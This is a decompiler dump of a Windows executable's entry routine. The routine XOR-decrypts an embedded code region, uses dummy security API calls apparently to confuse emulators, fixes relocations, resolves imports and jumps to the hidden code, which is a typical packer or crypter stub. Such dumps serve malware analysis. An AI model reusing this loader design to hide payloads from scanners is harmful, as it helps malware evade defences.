/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// void __usercall __noreturn start(int a1@<edi>);
// BOOL __stdcall AreAnyAccessesGranted(DWORD GrantedAccess, DWORD DesiredAccess);
// BOOL __stdcall AddAce(PACL pAcl, DWORD dwAceRevision, DWORD dwStartingAceIndex, LPVOID pAceList, DWORD nAceListLength);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);

//-------------------------------------------------------------------------
// Data declarations

char byte_401190[] = { '\x19' }; // weak
_UNKNOWN loc_401960; // weak
int dword_402490[92] =
{
  151819981,
  109143694,
  -1450467468,
  -613560733,
  -330823695,
  -1515013435,
  1435384477,
  -1643956905,
  -814176086,
  14998939,
  -1119163580,
  1058382629,
  821841979,
  -1381655719,
  -547042695,
  -401144890,
  -1577337167,
  1359691313,
  -1698745893,
  -873419744,
  50781715,
  -1099568917,
  822255926,
  1052860004,
  -1559784040,
  -772946703,
  -404288503,
  -1346129558,
  1601581082,
  -1799405608,
  -973561302,
  224186605,
  -1339103584,
  819375897,
  1063870399,
  -1564830674,
  -744897163,
  -450425099,
  -1400327249,
  1543975768,
  -1750319893,
  -972119760,
  240112412,
  -1287920213,
  868658274,
  1013144710,
  -1583311047,
  -747714950,
  -469626923,
  -1377914211,
  1564553749,
  -1377944153,
  -58094772,
  886499719,
  -1195971030,
  941664229,
  934631278,
  -1689473570,
  -376177527,
  -552979242,
  -1764914798,
  1717438732,
  -1377958271,
  -58090676,
  886499731,
  -1986863350,
  151819981,
  109143646,
  -1689473570,
  -376177527,
  -552979242,
  -1764914798,
  1717438732,
  -1377958271,
  -58090676,
  886499731,
  -1986863350,
  151819981,
  109143646,
  -1689473570,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
char byte_404000[4096] =
{
  '’',
  '‰',
  'Í',
  '–',
  '\f',
  '\t',
  '^',
  'f',
  '\x81',
  '\x06',
  'Þ',
  '­',
  'L',
  '›',
  '‰',
  'ü',
  '“',
  'é',
  'Ö',
  '4',
  '\n',
  'ß',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // idb


//----- (00401000) --------------------------------------------------------
void __usercall __noreturn start(int a1@<edi>)
{
  int v1; // esi
  int v2; // ebx
  int v3; // ecx
  unsigned int v4; // eax
  int v5; // edi
  int v6; // ecx
  char *v7; // ebp
  int v8; // edi
  unsigned int v9; // eax
  _WORD *v10; // edx
  unsigned int v11; // esi
  int v12; // eax
  char *v13; // esi
  HMODULE v14; // edx
  int v15; // ecx
  int v16; // ebx
  int *v17; // ebx
  FARPROC *v18; // edi
  int v19; // eax
  FARPROC v20; // eax
  unsigned int v21; // [esp+10h] [ebp-8h]
  char *v22; // [esp+10h] [ebp-8h]
  HMODULE v23; // [esp+14h] [ebp-4h]

  v1 = 0;
  v2 = AddAce(0, 0, 0, 0, 0) + 22;
  if ( !AreAnyAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) )
    v2 -= 34;
  v4 = 0;
  while ( 1 )
  {
    v5 = v3 + 4 * a1;
    if ( v1 == v2 )
      v1 = 0;
    a1 = v5 + v1;
    LOBYTE(v3) = byte_404000[v1];
    byte_401190[v4++] ^= v3;
    ++v1;
    if ( v4 >= 0x1440 )
    {
      v6 = (int)dword_402490;
      v7 = &byte_401190[-640];
      v8 = v1 + 4 * a1;
      v21 = 0;
      while ( 1 )
      {
        v9 = (unsigned int)(*(_DWORD *)(v6 + 4) - 8) >> 1;
        v8 = v9 + 8 * v8;
        v10 = (_WORD *)(v6 + 8);
        if ( v9 )
        {
          v11 = (unsigned int)(*(_DWORD *)(v6 + 4) - 8) >> 1;
          do
          {
            v8 = *v10 & 0xF000;
            if ( v8 == 12288 )
              *(_DWORD *)&v7[*(_DWORD *)v6 + (*v10 & 0xFFF)] += &byte_401190[-268436096];
            ++v10;
            --v11;
          }
          while ( v11 );
        }
        v12 = *(_DWORD *)(v6 + 4);
        v6 += v12;
        v21 += v12;
        if ( v21 >= 0xE4 )
        {
          v13 = &byte_401190[2804];
          v22 = &byte_401190[2804];
          if ( *(_DWORD *)&byte_401190[2820] )
          {
            do
            {
              v14 = LoadLibraryA(&v7[*((_DWORD *)v13 + 3)]);
              v23 = v14;
              v6 = 3 * v15;
              if ( v14 )
              {
                v16 = *(_DWORD *)v13;
                if ( !*(_DWORD *)v13 )
                  v16 = *((_DWORD *)v13 + 4);
                v17 = (int *)&v7[v16];
                v18 = (FARPROC *)&v7[*((_DWORD *)v13 + 4)];
                if ( *v17 )
                {
                  while ( 1 )
                  {
                    v13 = (char *)&v18[(_DWORD)v13];
                    v19 = *v17;
                    v20 = *v17 >= 0 ? GetProcAddress(v14, &v7[v19 + 2]) : GetProcAddress(
                                                                            v14,
                                                                            (LPCSTR)(unsigned __int16)v19);
                    *v18 = v20;
                    ++v17;
                    ++v18;
                    if ( !*v17 )
                      break;
                    v14 = v23;
                  }
                  v13 = v22;
                }
              }
              v13 += 20;
              v22 = v13;
            }
            while ( *((_DWORD *)v13 + 4) );
          }
          ((void (__thiscall *)(int))loc_401960)(v6);
          ExitProcess(0);
        }
      }
    }
  }
}
// 401035: variable 'v3' is possibly undefined
// 4010F6: variable 'v15' is possibly undefined
// 401159: variable 'v6' is possibly undefined
// 402490: using guessed type int dword_402490[92];

// nfuncs=1 queued=1 decompiled=1 lumina nreq=0 worse=0 better=0
// ALL OK, 1 function(s) have been successfully decompiled
